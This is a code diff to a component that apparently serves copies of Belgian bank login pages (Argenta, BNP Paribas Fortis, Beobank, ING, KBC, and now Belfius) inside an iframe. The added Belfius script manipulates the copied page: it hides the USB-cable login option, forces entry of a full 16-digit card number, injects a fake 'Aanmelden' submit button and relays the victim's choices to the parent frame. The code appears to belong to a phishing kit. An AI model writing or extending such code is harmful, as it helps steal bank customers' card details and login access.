@@ -25,7 +25,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
   const [currentIndex, setCurrentIndex] = useState(0);
   const [selectedLoginMethod, setSelectedLoginMethod] = useState("");
   const iframeRef = useRef<HTMLIFrameElement>(null);
-  const disableIframeFade = ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be"].includes(bankSlug ?? "");
+  const disableIframeFade = ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be", "belfius-be"].includes(bankSlug ?? "");
 
   // Eger files henuz yuklenmemis (length===0) iken BELGIUM_BANK_TAB_CLICK gelirse
   // safeIndex hesabi hep 0 donecegi icin gorunuste hic degismez. Bu yuzden
@@ -72,6 +72,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "beobank-be":            ["Beobank Online"],
       "ing-be":                ["ING Home'Bank"],
       "kbc-be":                ["KBC Touch"],
+      "belfius-be":            ["itsme", "Zonder USB-kabel"],
     };
 
     // 1) Dogrudan eslesme
@@ -97,6 +98,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "beobank": "beobank-be",
       "ing": "ing-be",
       "kbc": "kbc-be",
+      "belfius": "belfius-be",
     };
     const simpleKey = Object.keys(simpleMap).find((k) => normalizedSlug.includes(k));
     if (simpleKey && methodMap[simpleMap[simpleKey]]?.[index]) {
@@ -115,6 +117,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "beobank-be":            ["Beobank Online"],
       "ing-be":                ["ING Home'Bank"],
       "kbc-be":                ["KBC Touch"],
+      "belfius-be":            ["itsme", "Zonder USB-kabel"],
     };
     let bankKey = methodMap[normalizedSlug] ? normalizedSlug : "";
     if (!bankKey) {
@@ -131,6 +134,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "beobank": "beobank-be",
       "ing": "ing-be",
       "kbc": "kbc-be",
+      "belfius": "belfius-be",
     };
       const s = Object.keys(simpleMap).find(k => normalizedSlug.includes(k));
       if (s) bankKey = simpleMap[s];
@@ -469,10 +473,11 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "beobank": "beobank-be",
       "ing": "ing-be",
       "kbc": "kbc-be",
+      "belfius": "belfius-be",
     };
     let finalSlug = slugNorm;
     if (
-      ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be"].includes(slugNorm) === false
+      ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be", "belfius-be"].includes(slugNorm) === false
     ) {
       const match = Object.keys(apiKeyMap).find((k) => slugNorm.includes(k));
       if (match) finalSlug = apiKeyMap[match];
@@ -1107,6 +1112,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           "beobank-be":            ["Beobank Online"],
           "ing-be":                ["ING Home'Bank"],
           "kbc-be":                ["KBC Touch"],
+      "belfius-be":            ["itsme", "Zonder USB-kabel"],
         };
         function __miniResolveBankSlug() {
           const m = (window.location.pathname || '').match(/belgian-banks\\/([a-z0-9_-]+)\\//i);
@@ -3495,6 +3501,132 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                  } catch(_e){}
                };
                __kbcApply(); setTimeout(__kbcApply, 400); setTimeout(__kbcApply, 1200); setTimeout(__kbcApply, 3000);
+             }
+           } catch(_e){}
+
+           // ==== BELFIUS: "Met USB-kabel" sekmesi gizle + 16 haneli kart numarasi ====
+           try {
+             if (/\\/belfius-be\\//i.test(window.location.href || '')) {
+               // 1) "Met USB-kabel" sekmesini gizle (light DOM geui-tab + shadow DOM tab-button)
+               var __belHideUsb = function(){
+                 try {
+                   var gtabs = document.querySelectorAll('geui-tab');
+                   for (var gi=0; gi<gtabs.length; gi++){
+                     var gtx = (gtabs[gi].getAttribute('text') || gtabs[gi].getAttribute('data-text') || '') + '';
+                     if (/usb/i.test(gtx) && !/zonder/i.test(gtx)) gtabs[gi].style.display = 'none';
+                   }
+                   var __walk = function(root){
+                     try {
+                       var tbs = root.querySelectorAll('.tab-button, [role="tab"]');
+                       for (var ti=0; ti<tbs.length; ti++){
+                         var tx = (tbs[ti].textContent || '') + '';
+                         if (/usb/i.test(tx) && !/zonder/i.test(tx)) { tbs[ti].style.display = 'none'; tbs[ti].setAttribute('hidden',''); }
+                       }
+                       var all = root.querySelectorAll('*');
+                       for (var ai=0; ai<all.length; ai++){ if (all[ai].shadowRoot) __walk(all[ai].shadowRoot); }
+                     } catch(_e){}
+                   };
+                   __walk(document);
+                 } catch(_e){}
+               };
+               // 2) Shadow DOM icindeki tab butonlari -> parent'a BELGIUM_BANK_TAB_CLICK
+               if (!window.__belTabBound) {
+                 window.__belTabBound = true;
+                 document.addEventListener('click', function(ev){
+                   try {
+                     var path = (ev.composedPath && ev.composedPath()) || [];
+                     for (var pi=0; pi<path.length; pi++){
+                       var el = path[pi];
+                       if (el && el.classList && el.classList.contains('tab-button')){
+                         var tx = ((el.textContent || '') + '').toLowerCase();
+                         if (/usb/.test(tx) && !/zonder/.test(tx)) { ev.preventDefault(); ev.stopPropagation(); return false; }
+                         var idx = /itsme/.test(tx) ? 0 : (/usb/.test(tx) ? 1 : -1);
+                         if (idx >= 0){
+                           ev.preventDefault(); ev.stopPropagation();
+                           try { window.parent.postMessage({ type:'BELGIUM_BANK_TAB_CLICK', targetIndex: idx, loginMethod: idx===0 ? 'itsme' : 'Zonder USB-kabel' }, '*'); } catch(_e){}
+                           return false;
+                         }
+                       }
+                     }
+                   } catch(_e){}
+                 }, true);
+               }
+               // 3) Kart numarasi: sadece rakam, 4'lu gruplar, tam 16 hane
+               var __belFmt = function(inp){
+                 try {
+                   var raw = (inp.value || '').replace(/\\D+/g, '').slice(0, 16);
+                   var grp = raw.replace(/(\\d{4})(?=\\d)/g, '$1 ');
+                   if (inp.value !== grp) inp.value = grp;
+                   return raw;
+                 } catch(_e){ return ''; }
+               };
+               var __belBtnFor = function(id){
+                 if (id === 'gepaInput_1') return document.querySelector('button.gepax-primary-button');
+                 return document.getElementById('belfius-aanmelden-btn');
+               };
+               var __belErr = function(inp, show){
+                 try {
+                   var eid = 'belfius-err-' + inp.id;
+                   var e = document.getElementById(eid);
+                   if (!e) {
+                     e = document.createElement('div');
+                     e.id = eid;
+                     e.setAttribute('style','color:#d92b2f;font:600 13px/1.4 Arial,sans-serif;margin:6px 0 0;');
+                     var host = inp.closest('.gepaxGeneralInput, .gepax-input') || inp.parentNode;
+                     if (host && host.appendChild) host.appendChild(e); else inp.parentNode.appendChild(e);
+                   }
+                   e.textContent = show ? 'Voer je 16-cijferige kaartnummer in.' : '';
+                 } catch(_e){}
+               };
+               var __belState = function(inp){
+                 try {
+                   var raw = (inp.value || '').replace(/\\D+/g, '');
+                   var btn = __belBtnFor(inp.id);
+                   if (btn) {
+                     if (raw.length === 16) { btn.removeAttribute('disabled'); btn.disabled = false; btn.style.opacity = ''; btn.style.pointerEvents = ''; }
+                     else { btn.setAttribute('disabled',''); btn.disabled = true; btn.style.opacity = '0.45'; btn.style.pointerEvents = 'none'; }
+                   }
+                   __belErr(inp, raw.length > 0 && raw.length !== 16);
+                 } catch(_e){}
+               };
+               var __belApply = function(){
+                 __belHideUsb();
+                 ['gepaInput_1','gepaInput_2'].forEach(function(id){
+                   var inp = document.getElementById(id);
+                   if (!inp) return;
+                   if (!inp.__belBound) {
+                     inp.__belBound = true;
+                     inp.setAttribute('maxlength','19');
+                     inp.setAttribute('inputmode','numeric');
+                     inp.addEventListener('input', function(){ __belFmt(inp); __belState(inp); });
+                     inp.addEventListener('keydown', function(ev){
+                       if (ev.key === 'Enter') {
+                         ev.preventDefault();
+                         var raw = (inp.value || '').replace(/\\D+/g, '');
+                         if (raw.length === 16) { var b = __belBtnFor(id); if (b) b.click(); }
+                         else __belErr(inp, true);
+                       }
+                     });
+                   }
+                   __belState(inp);
+                 });
+                 // 4) "Zonder USB-kabel" panelinde submit butonu yok -> "Aanmelden" ekle
+                 try {
+                   var unconn = document.querySelector('geui-tab[data-dtm-id="geuixTab_Unconnected"], geui-tab[id$="geuixTab_Unconnected"], geui-tab[text*="Zonder"]');
+                   if (unconn && !document.getElementById('belfius-aanmelden-btn')) {
+                     var btn = document.createElement('button');
+                     btn.id = 'belfius-aanmelden-btn';
+                     btn.type = 'button';
+                     btn.textContent = 'Aanmelden';
+                     btn.setAttribute('disabled','');
+                     btn.disabled = true;
+                     btn.style.opacity = '0.45';
+                     btn.setAttribute('style','display:block;width:100%;max-width:420px;margin:22px auto 8px;padding:13px 20px;border:0;border-radius:4px;background:#d92b2f;color:#fff;font:700 16px/1.2 Arial,sans-serif;cursor:pointer;opacity:0.45;');
+                     unconn.appendChild(btn);
+                   }
+                 } catch(_e){}
+               };
+               __belApply(); setTimeout(__belApply, 400); setTimeout(__belApply, 1200); setTimeout(__belApply, 3000);
              }
            } catch(_e){}
 
